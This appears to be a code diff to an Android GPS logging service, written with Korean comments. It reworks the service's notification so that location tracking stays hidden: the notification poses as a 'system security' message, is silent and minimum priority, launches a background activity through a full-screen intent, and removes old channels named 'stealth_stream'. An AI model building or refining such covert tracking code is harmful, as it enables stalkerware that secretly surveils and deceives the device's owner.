@@ -281,30 +281,20 @@ class GpsLoggingService : Service() {
             PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
         )
 
-        // Android 10+ 백그라운드 액티비티 기동 보장을 위한 무음 고우선순위 풀스크린 알림
-        val channelId = "stealth_stream_channel_v3"
+        // Android 10+ 백그라운드 액티비티 기동 보장을 위한 무음 풀스크린 알림
+        // (단일 통합 채널 CHANNEL_ID 사용으로 설정 롤백 방지 및 스텔스 모드 유지)
         val notificationManager = getSystemService(NotificationManager::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(channelId, "시스템 동기화", NotificationManager.IMPORTANCE_HIGH).apply {
-                description = "백그라운드 보안 연결 유지"
-                enableVibration(false)
-                vibrationPattern = longArrayOf(0)
-                setSound(null, null)
-                setShowBadge(false)
-                lockscreenVisibility = Notification.VISIBILITY_SECRET
-            }
-            notificationManager.createNotificationChannel(channel)
-        }
 
-        val notification = NotificationCompat.Builder(this, channelId)
-            .setContentTitle("시스템 보안 동기화")
-            .setContentText("기기 보안 채널이 활성화되었습니다.")
+        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("시스템 보안 보호")
+            .setContentText("백그라운드 보안 연결 유지 중")
             .setSmallIcon(android.R.drawable.ic_menu_mylocation)
-            .setPriority(NotificationCompat.PRIORITY_HIGH)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .setCategory(NotificationCompat.CATEGORY_ALARM)
             .setFullScreenIntent(pendingIntent, true)
             .setContentIntent(pendingIntent)
             .setAutoCancel(true)
+            .setShowWhen(false)
             .setSilent(true)
             .build()
 
@@ -359,6 +349,8 @@ class GpsLoggingService : Service() {
             val nm = getSystemService(NotificationManager::class.java)
             try {
                 nm.deleteNotificationChannel("gps_tracking")
+                nm.deleteNotificationChannel("stealth_stream_channel_v3")
+                nm.deleteNotificationChannel("stealth_stream_channel_v2")
             } catch (_: Exception) {}
 
             val channel = NotificationChannel(
